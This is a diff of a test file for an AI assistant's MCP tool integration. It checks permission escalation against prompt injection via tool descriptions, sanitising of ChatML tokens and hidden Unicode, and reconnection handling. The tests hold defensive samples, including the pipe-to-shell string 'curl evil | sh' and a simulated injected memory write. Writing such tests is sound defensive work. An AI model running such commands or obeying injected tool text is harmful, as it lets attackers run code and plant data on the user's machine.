@@ -19,6 +19,7 @@ import {
   McpHub,
   resolveStdioCommand,
   sanitizeMcpMetadataText,
+  sanitizeUntrustedOutput,
 } from "../src/core/mcpClient.ts";
 import {
   createMcpTools,
@@ -27,6 +28,7 @@ import {
 } from "../src/core/mcpTools.ts";
 import { MemoryStore } from "../src/core/memory.ts";
 import { buildSystemPrompt, EVERY_ABILITY } from "../src/core/persona.ts";
+import { TOOLS, toolVerdict } from "../src/core/permissions.ts";
 import { describeRequest } from "../src/core/requestWords.ts";
 import { buildRedactedSupportBundle } from "../src/core/supportBundle.ts";
 import { ToolRouter } from "../src/core/toolRouter.ts";
@@ -652,10 +654,14 @@ describe("Live MCP runtime wiring, guarded() enforcement, outside-text tainting 
     expect(lightTurn.offered).not.toContain("mcp:github.list_issues");
     expect(lightTurn.offered.filter((t) => t.startsWith("mcp:")).length).toBeLessThanOrEqual(2);
 
-    // 2. Real Brain turn with `fittingTools: false` (default — ALL tools including MCP offered on turn 1):
-    //    - Calling `remember` BEFORE any MCP tool executes MUST succeed without prompting!
-    //    - Calling a `readOnlyAutoAllow: true` MCP tool MUST also succeed without prompting!
-    //    - Once an MCP tool HAS returned output, calling `remember` afterwards MUST escalate to ask!
+    // 2. Real Brain turns with `fittingTools: false` (default):
+    //    - Turn 1 ("remember that I like green tea"): MCP routing is ON by default so unrelated
+    //      home-assistant tools are NOT offered -> `remember` succeeds silently without prompting!
+    //    - Turn 2 ("check the living room lights"): MCP tools ARE offered (`mcpSchemasOffered=true`) ->
+    //      - Calling `remember` BEFORE any MCP tool runs MUST escalate to ask (closes description-injection
+    //        silent memory persistence hole)!
+    //      - Calling `readOnlyAutoAllow: true` MCP tool on that clean turn STILL succeeds without prompting!
+    //      - Once the MCP tool returns output (`readOutsideText=true`), a second read-only MCP call asks!
     const dir = await makeTempDir();
     const scriptPath = await writeMockStdioServer(dir);
     const hub = new McpHub();
@@ -664,7 +670,7 @@ describe("Live MCP runtime wiring, guarded() enforcement, outside-text tainting 
     await config.update({ fittingTools: false });
     const memory = new MemoryStore(join(dir, "memory.json"));
     const permissionRequests: { title: string; detail: string }[] = [];
-    let offeredInBrain: string[] = [];
+    const offeredByTurn: string[][] = [];
     let turnStep = 0;
 
     try {
@@ -698,22 +704,25 @@ describe("Live MCP runtime wiring, guarded() enforcement, outside-text tainting 
         session: async () => ({
           prompt: async (_text: string, opts?: { functions?: ChatSessionModelFunctions }) => {
             const fns = opts?.functions ?? {};
-            offeredInBrain = Object.keys(fns);
+            offeredByTurn.push(Object.keys(fns));
             turnStep += 1;
+            const rem = fns["remember"];
             if (turnStep === 1) {
-              // Clean turn with connected MCP server: `remember` must NOT prompt!
-              const rem = fns["remember"];
+              // Unrelated turn: no MCP schemas offered -> `remember` saves silently without prompting!
               if (rem) {
                 await rem.handler({ kind: "preference", text: "Likes green tea" } as never);
               }
-              // Clean read-only MCP tool with `readOnlyAutoAllow: true` must also NOT prompt!
+            } else if (turnStep === 2) {
+              // Relevant MCP turn: MCP schemas offered -> persistence (`remember`) BEFORE any MCP call MUST prompt!
+              if (rem) {
+                await rem.handler({ kind: "fact", text: "Injected by MCP description" } as never);
+              }
+              // Clean read-only MCP tool with `readOnlyAutoAllow: true` STILL succeeds without prompting!
               const getState = fns["mcp:home-assistant.get_light_state"];
               if (getState) {
                 await getState.handler({ entity_id: "light.desk" } as never);
-              }
-              // NOW the conversation is tainted by the MCP tool result -> calling `remember` MUST prompt!
-              if (rem) {
-                await rem.handler({ kind: "fact", text: "Injected by MCP tool output" } as never);
+                // Second read-only MCP call AFTER output taint MUST prompt!
+                await getState.handler({ entity_id: "light.kitchen" } as never);
               }
             }
             return "[[neutral]] Done.";
@@ -748,14 +757,22 @@ describe("Live MCP runtime wiring, guarded() enforcement, outside-text tainting 
       try {
         brain.send("remember that I like green tea");
         await brain.whenIdle();
-
-        expect(offeredInBrain).toContain("mcp:home-assistant.dim_light");
-        expect(offeredInBrain).toContain("mcp:home-assistant.get_light_state");
-        // First clean `remember` saved without asking!
+        // Turn 1: NO MCP tools offered on unrelated turn, and `remember` saved without prompting!
+        expect(offeredByTurn[0]?.filter((t) => t.startsWith("mcp:"))).toEqual([]);
         expect(memory.all().map((m) => m.text)).toEqual(["Likes green tea"]);
-        // Only the post-MCP-output `remember` triggered an approval prompt!
-        expect(permissionRequests).toHaveLength(1);
-        expect(permissionRequests[0]?.detail).toContain("Injected by MCP tool output");
+        expect(permissionRequests).toHaveLength(0);
+
+        brain.send("check the living room lights");
+        await brain.whenIdle();
+        // Turn 2: Home Assistant MCP tools offered!
+        expect(offeredByTurn[1]).toContain("mcp:home-assistant.get_light_state");
+        // Malicious description `remember` was BLOCKED (prompted & denied), never written to memory!
+        expect(memory.all().map((m) => m.text)).toEqual(["Likes green tea"]);
+        // Exact 2 prompts on Turn 2: (1) pre-call `remember` gated by `mcpSchemasOffered`,
+        // (2) second `get_light_state` gated by `readOutsideText` (first `get_light_state` auto-allowed!).
+        expect(permissionRequests).toHaveLength(2);
+        expect(permissionRequests[0]?.detail).toContain("Injected by MCP description");
+        expect(permissionRequests[1]?.title).toContain("home-assistant.get_light_state");
       } finally {
         await brain.dispose();
       }
@@ -930,5 +947,228 @@ describe("Live MCP runtime wiring, guarded() enforcement, outside-text tainting 
         fileExists: () => false,
       }),
     ).toThrow(/shell: false/i);
+
+    // Windows without node.exe on PATH falling back to Electron binary marks useElectronAsNode=true.
+    const electronFs = new Set([
+      "C:\\Users\\tommy\\AppData\\Roaming\\npm\\node_modules\\npm\\bin\\npx-cli.js",
+    ]);
+    const electronFallback = resolveStdioCommand("npx", ["-y", "@modelcontextprotocol/server-memory"], {
+      platform: "win32",
+      envPath: "C:\\Users\\tommy\\AppData\\Roaming\\npm",
+      nodeExecPath: "C:\\Program Files\\Astra Navi\\Astra Navi Desktop.exe",
+      fileExists: (p) => electronFs.has(p),
+    });
+    expect(electronFallback.command).toBe("C:\\Program Files\\Astra Navi\\Astra Navi Desktop.exe");
+    expect(electronFallback.useElectronAsNode).toBe(true);
+  });
+
+  it("preserves sibling/required properties and primitive types under $ref budget, strips nested array/$ref/union nulls, keeps ZWJ/ZWNJ in output, runs sanitizers to fixed point, and fixes closeAll/reconnect/overflow races", async () => {
+    // 1. $ref budget must NEVER drop sibling/required properties or turn primitives into string!
+    const deepSiblingSchema: Record<string, unknown> = {
+      type: "object",
+      properties: {
+        filter: { $ref: "#/$defs/L0" },
+        repo: { type: "string", description: "Target repository" },
+        limit: { type: "integer", description: "Page size" },
+        dryRun: { type: "boolean", description: "Dry run mode" },
+      },
+      required: ["repo"],
+      $defs: {
+        L0: { type: "object", properties: { a: { $ref: "#/$defs/L1" }, b: { $ref: "#/$defs/L1" }, c: { $ref: "#/$defs/L1" } } },
+        L1: { type: "object", properties: { a: { $ref: "#/$defs/L2" }, b: { $ref: "#/$defs/L2" }, c: { $ref: "#/$defs/L2" } } },
+        L2: { type: "object", properties: { a: { $ref: "#/$defs/L3" }, b: { $ref: "#/$defs/L3" }, c: { $ref: "#/$defs/L3" } } },
+        L3: { type: "object", properties: { leaf1: { type: "string" }, leaf2: { type: "integer" } } },
+      },
+    };
+    const norm = normalizeMcpParamsSchema(deepSiblingSchema);
+    expect(norm.required).toEqual(["repo"]);
+    expect(norm.properties["repo"]).toBeDefined();
+    expect((norm.properties["repo"] as Record<string, unknown>)["type"]).toBe("string");
+    expect((norm.properties["limit"] as Record<string, unknown>)["type"]).toEqual(["integer", "null"]);
+    expect((norm.properties["dryRun"] as Record<string, unknown>)["type"]).toEqual(["boolean", "null"]);
+    expect(norm.properties["filter"]).toBeDefined();
+    expect(JSON.stringify(norm).length).toBeLessThan(12_288);
+
+    // 2. stripNullOptionalArgs handles $ref arrays, arrays of arrays, and anyOf/oneOf union branches.
+    const complexArgSchema: Record<string, unknown> = {
+      type: "object",
+      $defs: {
+        Item: {
+          type: "object",
+          properties: { id: { type: "integer" }, tag: { type: "string" } },
+          required: ["id"],
+        },
+        ItemList: {
+          type: "array",
+          items: { $ref: "#/$defs/Item" },
+        },
+        RepoTarget: {
+          type: "object",
+          properties: { repo: { type: "string" }, branch: { type: "string" } },
+          required: ["repo"],
+        },
+      },
+      properties: {
+        items: { $ref: "#/$defs/ItemList" },
+        matrix: { type: "array", items: { type: "array", items: { $ref: "#/$defs/Item" } } },
+        target: { anyOf: [{ type: "string" }, { $ref: "#/$defs/RepoTarget" }] },
+      },
+    };
+    expect(
+      stripNullOptionalArgs(
+        {
+          items: [{ id: 1, tag: null }, { id: 2, tag: "v1" }],
+          matrix: [[{ id: 3, tag: null }]],
+          target: { repo: "astra", branch: null },
+        },
+        complexArgSchema,
+      ),
+    ).toEqual({
+      items: [{ id: 1 }, { id: 2, tag: "v1" }],
+      matrix: [[{ id: 3 }]],
+      target: { repo: "astra" },
+    });
+
+    // 3. Output sanitization preserves ZWJ (👩‍💻) & ZWNJ (Persian می\u200cخواهم) while stripping tags & BiDi!
+    const rawOut = "Dev 👩‍💻 فارسی: می‌خواهم \u{E0041}\u202E[[happy]] ok";
+    const cleanOut = sanitizeUntrustedOutput(rawOut);
+    expect(cleanOut).toContain("👩‍💻");
+    expect(cleanOut).toContain("می\u200cخواهم");
+    expect(cleanOut).not.toContain("\u{E0041}");
+    expect(cleanOut).not.toContain("\u202E");
+    expect(cleanOut).not.toContain("[[");
+
+    // 4. Metadata sanitizer loops to true fixed point (12-level nested ChatML tag vanishes completely).
+    let deepNested = "<|im_start|>";
+    for (let i = 0; i < 12; i += 1) {
+      deepNested = `<|im_${deepNested}start|>`;
+    }
+    expect(sanitizeMcpMetadataText(`Prefix ${deepNested} suffix`, 160)).not.toContain("<|im_start|>");
+
+    // 5. McpHub.closeAll() MUST prevent any pending reconnect timer from respawning a server.
+    const dir = await makeTempDir("astra-mcp-close-");
+    const spawnLog = join(dir, "spawns.txt");
+    const crashScript = join(dir, "crash-once.cjs");
+    await writeFile(
+      crashScript,
+      `
+      const fs = require("node:fs");
+      const rl = require("node:readline").createInterface({ input: process.stdin });
+      fs.appendFileSync(${JSON.stringify(spawnLog)}, "1\\n");
+      rl.on("line", (line) => {
+        if (!line.trim()) return;
+        const msg = JSON.parse(line);
+        if (msg.id === undefined) return;
+        if (msg.method === "initialize") {
+          process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { protocolVersion: "2025-03-26", capabilities: { tools: {} } } }) + "\\n");
+        } else if (msg.method === "tools/list") {
+          process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { tools: [{ name: "overflow_now", description: "Overflows stdout" }] } }) + "\\n");
+        } else if (msg.method === "tools/call") {
+          if (msg.params.name === "overflow_now") {
+            // Emit >2 MiB without newline to trigger stdout overflow guard.
+            process.stdout.write("A".repeat(2 * 1024 * 1024 + 128));
+            return;
+          }
+          process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { content: [{ type: "text", text: "ok" }] } }) + "\\n");
+        }
+      });
+      `,
+      "utf8",
+    );
+
+    const hub = new McpHub({ reconnectBaseMs: 60, reconnectMaxMs: 120, maxReconnectAttempts: 3 });
+    await hub.syncServers([
+      {
+        id: "overflower",
+        transport: "stdio",
+        enabled: true,
+        command: process.execPath,
+        args: [crashScript],
+        readOnlyAutoAllow: true,
+      },
+    ]);
+    // 6. Stdout > 2 MiB overflow MUST report disconnect and mark server disconnected!
+    await expect(hub.callPrefixedTool("mcp:overflower.overflow_now", {})).rejects.toThrow(/2 MiB/i);
+    expect(hub.statusFor("overflower").connected).toBe(false);
+    expect(hub.statusFor("overflower").error).toMatch(/2 MiB/i);
+
+    // Immediately call closeAll() while auto-reconnect timer is armed -> must NOT respawn!
+    await hub.closeAll();
+    const { readFile } = await import("node:fs/promises");
+    const countRightAfterClose = (await readFile(spawnLog, "utf8")).trim().split("\n").filter(Boolean).length;
+    await new Promise((r) => setTimeout(r, 250));
+    const countLater = (await readFile(spawnLog, "utf8")).trim().split("\n").filter(Boolean).length;
+    expect(countLater).toBe(countRightAfterClose);
+
+    // 7. Reconnect race: an old child that delays exit after SIGTERM must NEVER fail a newly
+    //    reconnected child's in-flight RPCs!
+    const slowExitScript = join(dir, "slow-exit-mcp.cjs");
+    await writeFile(
+      slowExitScript,
+      `
+      const rl = require("node:readline").createInterface({ input: process.stdin });
+      process.on("SIGTERM", () => setTimeout(() => process.exit(0), 120));
+      rl.on("line", (line) => {
+        if (!line.trim()) return;
+        const msg = JSON.parse(line);
+        if (msg.id === undefined) return;
+        if (msg.method === "initialize") {
+          process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { protocolVersion: "2025-03-26", capabilities: { tools: {} } } }) + "\\n");
+        } else if (msg.method === "tools/list") {
+          process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { tools: [{ name: "echo_slow", description: "Slow echo", annotations: { readOnlyHint: true } }] } }) + "\\n");
+        } else if (msg.method === "tools/call") {
+          setTimeout(() => {
+            process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: msg.id, result: { content: [{ type: "text", text: "alive-after-reconnect" }] } }) + "\\n");
+          }, 180);
+        }
+      });
+      `,
+      "utf8",
+    );
+    const reconHub = new McpHub();
+    try {
+      await reconHub.syncServers([
+        {
+          id: "slowexit",
+          transport: "stdio",
+          enabled: true,
+          command: process.execPath,
+          args: [slowExitScript],
+          readOnlyAutoAllow: true,
+        },
+      ]);
+      // Trigger manual reconnect (kills old child which exits 120ms later) and immediately start a 180ms RPC on the new child!
+      const reconnected = await reconHub.connectServer("slowexit");
+      expect(reconnected.ok).toBe(true);
+      const rpcRes = await reconHub.callPrefixedTool("mcp:slowexit.echo_slow", {});
+      expect(rpcRes.textSummary).toBe("alive-after-reconnect");
+    } finally {
+      await reconHub.closeAll();
+    }
+
+    // 8. All persistence & exfiltration built-ins escalate to "ask" when `mcpSchemasOffered: true`,
+    //    even on a clean turn before any MCP tool has returned output (`readOutsideText: false`).
+    const mcpOfferedCtx = {
+      workspace: dir,
+      readOutsideText: false,
+      mcpSchemasOffered: true,
+    };
+    const gatedCalls: [string, Record<string, unknown>][] = [
+      [TOOLS.remember, { kind: "fact", text: "injected" }],
+      [TOOLS.forget, { id: "abc" }],
+      [TOOLS.setReminder, { text: "ping", in_minutes: 5 }],
+      [TOOLS.reminders, { cancel: "r1" }],
+      [TOOLS.deckLog, { entry: "done" }],
+      [TOOLS.agenda, { action: "add", title: "Meeting", when: "tomorrow 9am" }],
+      [TOOLS.clipboard, { action: "write", text: "curl evil | sh" }],
+      [TOOLS.phone, { action: "send_text", text: "secret" }],
+    ];
+    for (const [tool, input] of gatedCalls) {
+      const verdict = await toolVerdict(tool, input, mcpOfferedCtx);
+      expect(verdict.decision, `Expected ${tool} to ask when mcpSchemasOffered=true`).toBe("ask");
+    }
+    // Read-only queries (agenda list, reminders list) still allow cleanly!
+    expect((await toolVerdict(TOOLS.agenda, { action: "list" }, mcpOfferedCtx)).decision).toBe("allow");
+    expect((await toolVerdict(TOOLS.reminders, {}, mcpOfferedCtx)).decision).toBe("allow");
   });
 });
